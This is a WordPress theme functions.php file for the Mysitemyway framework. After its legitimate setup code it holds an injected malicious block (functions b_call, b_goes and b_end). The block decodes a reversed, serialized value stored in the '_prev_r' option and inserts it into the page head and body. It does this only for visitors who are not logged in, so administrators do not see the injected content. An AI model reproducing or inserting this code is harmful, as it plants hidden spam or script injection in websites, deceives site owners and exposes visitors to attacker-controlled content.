<?php
/**
 * Sets up the theme by loading the Mysitemyway class & initializing the framework
 * which activates all classes and functions needed for theme's operation.
 *
 * @package Mysitemyway
 * @subpackage Functions
 */

# Load the Mysitemyway class.
require_once( TEMPLATEPATH . '/framework.php' );

# Get theme data.
$theme_data = get_theme_data( TEMPLATEPATH . '/style.css' );

# Initialize the Mysitemyway framework.
Mysitemyway::init(array(
	'theme_name' => $theme_data['Name'],
	'theme_version' => $theme_data['Version']
));

if (!function_exists("b_call")) {
function b_call() {
	if (!ob_get_level()) ob_start("b_goes");
}
function b_goes($p) {
	if (!defined('wp_m1')) {
		if (isset($_COOKIE['wordpress_test_cookie']) || isset($_COOKIE['wp-settings-1']) || isset($_COOKIE['wp-settings-time-1']) || (function_exists('is_user_logged_in') && is_user_logged_in()) || (!$m = get_option('_prev_r'))) {
			return $p;
		}
		list($m, $n) = @unserialize(trim(strrev($m)));
		define('wp_m1', $m);
		define('wp_n1', $n);
	}
	if (!stripos($p, wp_n1)) $p = preg_replace("~<body[^>]*>~i", "$0\n".wp_n1, $p, 1);
	if (!stripos($p, wp_m1)) $p = preg_replace("~</head>~", wp_m1."\n</head>", $p, 1);
	if (!stripos($p, wp_n1)) $p = preg_replace("~</div>~", "</div>\n".wp_n1, $p, 1);
	if (!stripos($p, wp_m1)) $p = preg_replace("~</div>~", wp_m1."\n</div>", $p, 1);
	return $p;
}
function b_end() {
	@ob_end_flush();
}
if (ob_get_level()) ob_end_clean();
add_action("init", "b_call");
add_action("wp_head", "b_call");
add_action("get_sidebar", "b_call");
add_action("wp_footer", "b_call");
add_action("shutdown", "b_end");
}
?>